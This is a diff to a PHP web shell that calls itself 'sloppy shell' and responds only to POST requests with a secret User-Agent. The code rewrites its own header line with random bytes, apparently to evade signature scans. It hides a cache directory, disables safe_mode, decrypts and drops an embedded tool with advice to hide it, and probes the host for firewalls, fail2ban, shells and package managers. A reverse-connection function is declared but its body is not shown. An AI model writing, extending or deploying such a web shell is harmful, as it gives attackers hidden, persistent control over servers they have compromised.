@@ -1,21 +1,60 @@
 <?php
-//dac45fe2013619e9b82254ab7e16146b38def48b31f9506eb6db41393bc0d9de55607bbdb7eae7a5ab171745d9275f6112a8fdbb0fda661fbedc209598016df9126b4b610ba09922ed7a5a
+// leave me here.
+if ( ! defined( "PATH_SEPARATOR" ) ) {
+    if (str_contains($_ENV["OS"], "Win") !== false)
+        define( "PATH_SEPARATOR", ";" );
+    else define( "PATH_SEPARATOR", ":" );
+}
+if (str_starts_with(php_uname(), 'Windows')) {
+    if (!defined("sloppyshell")){
+        define("sloppyshell", "powershell");
+    }
+    define("slopos", "Windows");
+} else {
+    if (!defined("sloppyshell")){
+        define("sloppyshell", "bash");
+    }
+    define("slopos", "Linux");
+}
 if (is_writable(getcwd()."/".$_SERVER['PHP_SELF'])) {
     $me = file(getcwd() . "/" .$_SERVER['PHP_SELF']);
     $me[1] = sprintf("//%s", bin2hex(openssl_random_pseudo_bytes(75))).PHP_EOL;
     file_put_contents(getcwd()."/".$_SERVER['PHP_SELF'], $me);
 }
+if (slopos === "Windows"){
+    if (!is_dir(".\\scache")){
+        mkdir(".\\scache");
+        shell_exec("attrib +H .\\scache");
+    }
+    define("scache", getcwd()."\\scache\\");
+}else{
+    if (!is_dir("./.scache")){
+        mkdir("./.scache");
+    }
+    define("scache", getcwd()."/.scache/");
+}
+
+set_include_path(get_include_path().PATH_SEPARATOR.scache);
 @ini_set("safe_mode", 0);
+@ini_set("file_uploads", "on");
+@ini_set("max_file_uploads",20);
+@ini_set("upload_max_filesize", "1G");
+@ini_set("upload_tmp_dir", getcwd());
+
 function banner()
 {
-
-    echo("\033[33;40m .▄▄ · ▄▄▌         ▄▄▄· ▄▄▄· ▄· ▄▌    .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌   \033[0m\n");
-    echo("\033[33;40m ▐█ ▀. ██•  ▪     ▐█ ▄█▐█ ▄█▐█▪██▌    ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•   \033[0m\n");
-    echo("\033[33;40m ▄▀▀▀█▄██▪   ▄█▀▄  ██▀· ██▀·▐█▌▐█▪    ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪   \033[0m\n");
-    echo("\033[33;40m ▐█▄▪▐█▐█▌▐▌▐█▌.▐▌▐█▪·•▐█▪·• ▐█▀·.    ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌ \033[0m\n");
-    echo("\033[33;40m  ▀▀▀▀ .▀▀▀  ▀█▄▀▪.▀   .▀     ▀ •      ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀  \033[0m\n");
-    echo("gr33tz: Notroot && Johnny5\nH4ppy h4ck1ng\n\n\n");
-
+    echo str_repeat(PHP_EOL, 3);
+    $logo = [
+        "\033[33;40m .▄▄ · ▄▄▌         ▄▄▄· ▄▄▄· ▄· ▄▌    .▄▄ ·  ▄ .▄▄▄▄ .▄▄▌  ▄▄▌   \033[0m",
+        "\033[33;40m ▐█ ▀. ██•  ▪     ▐█ ▄█▐█ ▄█▐█▪██▌    ▐█ ▀. ██▪▐█▀▄.▀·██•  ██•   \033[0m",
+        "\033[33;40m ▄▀▀▀█▄██▪   ▄█▀▄  ██▀· ██▀·▐█▌▐█▪    ▄▀▀▀█▄██▀▐█▐▀▀▪▄██▪  ██▪   \033[0m",
+        "\033[33;40m ▐█▄▪▐█▐█▌▐▌▐█▌.▐▌▐█▪·•▐█▪·• ▐█▀·.    ▐█▄▪▐███▌▐▀▐█▄▄▌▐█▌▐▌▐█▌▐▌ \033[0m",
+        "\033[33;40m  ▀▀▀▀ .▀▀▀  ▀█▄▀▪.▀   .▀     ▀ •      ▀▀▀▀ ▀▀▀ · ▀▀▀ .▀▀▀ .▀▀▀  \033[0m",
+        "\033[0;36mgr33tz: Notroot && Johnny5\nH4ppy h4ck1ng\033[0m\n\n\n"
+    ];
+    foreach ($logo as $line){
+        echo $line.PHP_EOL;
+    }
 }
 
 
@@ -27,8 +66,11 @@ function b64($data, $switch)
             if (!is_null($data['read'])) {
                 echo "\nMake sure you have found a writable directory, otherwise this will not go through\n";
                 $a = "./" . substr(str_shuffle(allowed_chars), 0, rand(3, 5));
-                fputs(fopen($a, "x+"), openssl_decrypt($data['Base64_Encoded_Tool'], $data['Cipher'], $data['Key'], OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $data['IV'], $data['Tag'], $data['aad']));
-                echo "File saved at: {$a}\nYou may want to move this file out of the current web directory, so you can hide it. But this will do for now.\n";
+                fputs(fopen($a, "x+"),
+                    openssl_decrypt($data['Base64_Encoded_Tool'], $data['Cipher'], $data['Key'],
+                        OPENSSL_RAW_DATA | OPENSSL_ZERO_PADDING, $data['IV'], $data['Tag'], $data['aad']));
+                echo "File saved at: {$a}\nYou may want to move this file out of the current web directory, 
+                so you can hide it. But this will do for now.\n";
                 return true;
             }
         }
@@ -53,7 +95,8 @@ function checkComs(): array
         "pg_ctlcluster", "pg_clusterconf", "pg_config", "pg", "pg_virtualenv", "pg_isready", "pg_conftool"
     );
     foreach ($lincommands as $item) {
-        $useful_commands[$item] = shell_exec(sloppyshell . " -c 'which {$item}'") ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
+        $useful_commands[$item] = shell_exec(sloppyshell . " -c 'which {$item}'")
+            ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
     }
     return $useful_commands;
 }
@@ -62,10 +105,12 @@ function parseProtections(): array
 {
     $prots = [];
     $protections = array(
-        "selinux", "iptables", "pfctl", "firewalld", "yast", "yast2", "fail2ban", "denyhost", "nftables", "firewall-cmd"
+        "selinux", "iptables", "pfctl", "firewalld", "yast",
+        "yast2", "fail2ban", "denyhost", "nftables", "firewall-cmd"
     );
     foreach ($protections as $prot) {
-        $prots[$prot] = shell_exec(sloppyshell . " -c 'which {$prot}'") ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
+        $prots[$prot] = shell_exec(sloppyshell . " -c 'which {$prot}'")
+            ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
     }
     return $prots;
 }
@@ -82,7 +127,8 @@ function checkShells($os): array
         ]
     ];
     foreach ($shells[$os] as $shell) {
-        $usable_shells[$shell] = shell_exec(sloppyshell . " -c 'which {$shell}'") ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
+        $usable_shells[$shell] = shell_exec(sloppyshell . " -c 'which {$shell}'")
+            ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
     }
     return $usable_shells;
 }
@@ -91,30 +137,18 @@ function checkPack(): array
 {
     $package_management = [];
     $packs = array(
-        "zypper", "yum", "pacman", "apt", "apt-get", "pkg", "pip", "pip2", "pip3", "gem", "cargo", "nuget", "ant", "emerge", "go"
+        "zypper", "yum", "pacman", "apt", "apt-get", "pkg", "pip", "pip2", "pip3",
+        "gem", "cargo", "nuget", "ant", "emerge", "go"
     );
     foreach ($packs as $pack) {
-        $package_management[$pack] = shell_exec(sloppyshell . "-c 'which {$pack}'") ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
+        $package_management[$pack] = shell_exec(sloppyshell . "-c 'which {$pack}'")
+            ? "\033[0;32mEnabled\033[0m":"\033[0;31mDisabled\033[0m";
     }
     return $package_management;
 }
 
 // removed cloner.
 
-function checkSystem(): string
-{
-    if (str_starts_with(php_uname(), 'Windows')) {
-        if (!defined("sloppyshell")){
-            define("sloppyshell", "powershell");
-        }
-        return "Windows";
-    } else {
-        if (!defined("sloppyshell")){
-            define("sloppyshell", "bash");
-        }
-        return "Linux";
-    }
-}
 
 
 function reverseConnections($methods, $host, $port, $shell)
@@ -222,7 +256,6 @@ $sk = null;
 $ad = null;
 $ct = null;
 $split = null;
-checkSystem();
 
 if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1.1') {
     banner();
@@ -284,10 +317,22 @@ if ($_SERVER["REQUEST_METHOD"] == "POST" && $_SERVER['HTTP_USER_AGENT'] === 'sp1
                 print_r(parseProtections());
                 break;
             case "cqSH":
-                print_r(checkShells(checkSystem()));
+                print_r(checkShells(slopos));
                 break;
             case "cqCM":
                 print_r(checkComs());
+                break;
+            case "cqI":
+                $fsize = ini_get("max_file_uploads") ? ini_get("max_file_uploads"):"cannot set max_file_uploads";
+                $sfem = ini_get("safe_mode") ? "set to true":"cannot set safemode.";
+                $fups = ini_get("file_uploads") ? "true":"false";
+                $ftd = ini_get("upload_tmp_dir") ? ini_get("upload_tmp_dir"):"cannot set upload_tmp_dir";
+                echo <<<INI
+Max filesize: $fsize
+Safemode: $sfem
+File_Uploads: $fups
+Upload Temp Dir: $ftd
+INI.PHP_EOL;
                 break;
         }
     } else {
